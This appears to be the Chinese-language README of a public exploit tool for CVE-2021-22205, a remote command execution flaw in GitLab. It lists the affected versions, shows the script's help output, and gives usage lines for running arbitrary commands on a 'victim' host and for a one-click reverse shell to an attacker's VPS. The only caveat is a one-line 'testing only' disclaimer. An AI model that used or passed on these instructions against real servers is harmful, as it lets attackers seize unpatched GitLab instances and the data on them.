# CVE-2021-22205
由于Gitlab未正确验证传递到文件解析器的图像文件从而导致命令执行。攻击者可构造恶意请求利用该漏洞在目标系统执行任意指令，最终导致Gitlab服务器被控制。由于网上大多缺少反弹shell，故修改了网上写的脚本，增加了一键getshell功能

## 影响版本
* 11.9 <=  GitLab（CE/EE）< 13.8.8
* 13.9 <=  GitLab（CE/EE）< 13.9.6
* 13.10 <= GitLab（CE/EE）< 13.10.3

## 使用说明
```shell
	  ______     _______     ____   ___ ____  _      ____  ____  ____   ___  ____  
	 / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \|___ \|___ \ / _ \| ___| 
	| |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | __) | __) | | | |___ \ 
	| |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/ / __/ / __/| |_| |___) |
 	\____ |  \_/  |_____|   |_____|\___/_____|_|    |_____|_____|_____|\___/|____/ 
    	
usage: CVE-2021-22205.py [-h] [-t TARGET] [-c COMMAND] [--shell] [-i IP]
                         [-p PORT]

GitLab < 13.10.3 RCE

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        目标URL
  -c COMMAND, --command COMMAND
                        执行命令
  --shell               是否反弹shell
  -i IP, --ip IP        反弹shell ip
  -p PORT, --port PORT  反弹shell端口
```
## 使用
```shell
python3 CVE-2021-22205.py -t [受害者ip] --shell -i [vps ip] -p [vps port] //反弹shell
python3 CVE-2021-22205.py -t [受害者ip] -c [command] //执行命令
```
## 声明
此脚本仅可用于测试使用，勿作他用
